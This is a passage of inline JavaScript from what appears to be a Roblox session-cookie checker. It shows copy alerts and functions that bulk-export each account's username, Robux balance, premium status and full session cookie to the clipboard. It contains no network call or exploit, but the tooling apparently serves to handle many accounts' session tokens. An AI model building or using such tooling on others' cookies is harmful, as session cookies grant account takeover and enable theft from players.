            successDiv.textContent = message;
            document.body.appendChild(successDiv);

            setTimeout(() => {
                document.body.removeChild(successDiv);
            }, 2000);
        }

        function showAutoCardAnimation(username) {
            const autoAlert = document.createElement('div');
            autoAlert.className = 'auto-copy-alert';
            autoAlert.innerHTML = `
                <div class="auto-copy-content">
                    <div class="auto-copy-icon">🍪✨</div>
                    <div class="auto-copy-title">AUTO-COPIED!</div>
                    <div class="auto-copy-subtitle">${username}'s cookie copied to clipboard</div>
                    <div class="auto-copy-action">Ready to paste anywhere! 📋</div>
                </div>
            `;
            document.body.appendChild(autoAlert);

            setTimeout(() => {
                if (document.body.contains(autoAlert)) {
                    document.body.removeChild(autoAlert);
                }
            }, 4000);
        }

        async function copyAllInfo(cookieId) {
            const cookie = cookies.find(c => c.id === cookieId);
            if (!cookie || !cookie.isValid) return;

            const allInfo = `
=== Roblox Account Information ===
Username: ${cookie.username || 'N/A'}
Display Name: ${cookie.displayName || 'N/A'}
User ID: ${cookie.userId || 'N/A'}
Robux: ${cookie.robux || 0}
Premium: ${cookie.isPremium ? 'Yes' : 'No'}
Followers: ${cookie.followers || 0}
Following: ${cookie.following || 0}
Account Created: ${cookie.created ? new Date(cookie.created).toLocaleDateString() : 'N/A'}
Description: ${(cookie.description && cookie.description.trim()) || 'No description'}
Cookie: ${cookie.fullCookie || 'N/A'}
Last Checked: ${new Date(cookie.lastChecked).toLocaleString()}
Added At: ${cookie.addedAt ? new Date(cookie.addedAt).toLocaleString() : 'N/A'}
            `.trim();

            await copyToClipboard(allInfo, 'All account information');
        }

        // Add bulk copy all cookies function
        async function copyAllCookiesInfo() {
            const validCookies = cookies.filter(c => c.isValid && !c.isLoading);
            if (validCookies.length === 0) {
                showNotification('No valid cookies to copy', 'warning');
                return;
            }

            let allCookiesInfo = '=== All Roblox Accounts Information ===\n\n';

            validCookies.forEach((cookie, index) => {
                allCookiesInfo += `--- Account ${index + 1} ---\n`;
                allCookiesInfo += `Username: ${cookie.username || 'N/A'}\n`;
                allCookiesInfo += `Display Name: ${cookie.displayName || 'N/A'}\n`;
                allCookiesInfo += `User ID: ${cookie.userId || 'N/A'}\n`;
                allCookiesInfo += `Robux: ${cookie.robux || 0}\n`;
                allCookiesInfo += `Premium: ${cookie.isPremium ? 'Yes' : 'No'}\n`;
                allCookiesInfo += `Followers: ${cookie.followers || 0}\n`;
                allCookiesInfo += `Following: ${cookie.following || 0}\n`;
                allCookiesInfo += `Cookie: ${cookie.fullCookie || 'N/A'}\n`;
                allCookiesInfo += `\n`;
            });

            await copyToClipboard(allCookiesInfo, `Information for ${validCookies.length} accounts`);
        }
    </script>
